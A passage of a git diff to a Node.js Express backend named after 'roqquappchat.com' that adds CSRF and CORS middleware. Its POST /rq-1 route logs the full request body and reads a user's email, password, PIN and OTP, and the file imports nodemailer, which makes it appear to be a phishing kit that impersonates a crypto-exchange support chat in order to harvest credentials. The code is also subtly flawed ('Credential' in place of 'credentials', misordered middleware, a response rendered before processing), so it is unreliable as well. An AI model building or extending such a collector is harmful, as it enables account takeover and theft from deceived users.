@@ -1,30 +1,45 @@
 const express = require('express')
 const app = express()
 const nodemailer = require('nodemailer')
+const csrf = require('csurf')
+const cookieParser = require('cookie-parser')
+const cors = require('cors')
 
 app.use(express.json())
 app.use(express.urlencoded({ extended: true }))
 
-app.use((req, res, next) => {
-    res.setHeader('Access-Control-Allow-Origin', 'https://roqquappchat.com')
-    res.setHeader(
-        'Access-Control-Allow-Methods',
-        'OPTIONS, GET, POST, PUT, PATCH, DELETE'
-    )
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+const csrfProtection = csrf({ cookie: true })
 
-    if (req.method === 'OPTIONS') {
-        return res.sendStatus(200)
-    }
-    next()
-})
+const corsOptions = {
+    origin: 'https://roqquappchat.com',
+    Credential: true
+}
+
+app.use(cors(corsOptions))
+
+// app.use((req, res, next) => {
+//     res.setHeader('Access-Control-Allow-Origin', 'https://roqquappchat.com')
+//     res.setHeader(
+//         'Access-Control-Allow-Methods',
+//         'OPTIONS, GET, POST, PUT, PATCH, DELETE'
+//     )
+//     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+
+//     if (req.method === 'OPTIONS') {
+//         return res.sendStatus(200)
+//     }
+//     next()
+// })
+
+app.use(cookieParser())
 
 app.get('/', (req, res) => {
     res.send('Welcome to rq1-back current name -- roqquappchat')
 })
 
-app.post('/rq-1', (req, res, next) => {
+app.post('/rq-1', csrfProtection, (req, res, next) => {
     console.log('req body', req.body)
+     res.render('send', { csrfToken: req.csrfToken() })
 
     const { email, password, pin, otp } = req.body
 
